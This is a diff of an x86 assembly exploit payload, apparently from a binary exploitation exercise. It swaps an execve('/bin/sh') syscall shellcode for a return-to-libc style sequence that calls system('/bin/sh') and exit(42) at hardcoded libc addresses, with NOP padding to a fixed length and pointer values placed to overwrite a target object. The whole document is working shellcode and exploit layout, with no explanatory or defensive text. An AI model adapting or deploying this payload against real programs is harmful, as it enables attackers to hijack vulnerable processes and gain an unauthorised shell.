@@ -1,35 +1,32 @@
         .intel_syntax noprefix
 
-        .set SYS_execve, 0xb
-        .set N1, 0x804a008 + 8
-        .set binsh, 0xb7ea7c58
+        .set N1,          0x0804a008
+        .set binsh,       0xb7ea7c58
+        .set libc_system, 0xb7d86060
+        .set libc_exit,   0xb7d79be0
 
         .section .rodata
 
 payload_start:
-        .int N1
+        // &N1->annotation[4]
+        .int N1 + 8
 
-        .rept 12
-        nop
-        .endr
+        // system("/bin/sh")
+        mov dword ptr [esp], binsh
+        mov eax, libc_system
+        call eax
 
-        mov  eax, binsh
-        mov  [N1], eax
-
-        xor  eax, eax
-        mov  [N1 + 4], eax
-
-        mov  al, SYS_execve
-        mov  ebx, binsh
-        mov  ecx, N1
-        xor  edx, edx
-
-        int  0x80
+        // exit(42)
+        xor eax, eax
+        mov al, 42
+        mov [esp], eax
+        mov eax, libc_exit
+        call eax
 
 shellcode_end:
-
         .rept 108 - (shellcode_end - payload_start)
         nop
         .endr
 
-        .int N1 - 4
+        // &N1->annotation[0]
+        .int N1 + 4
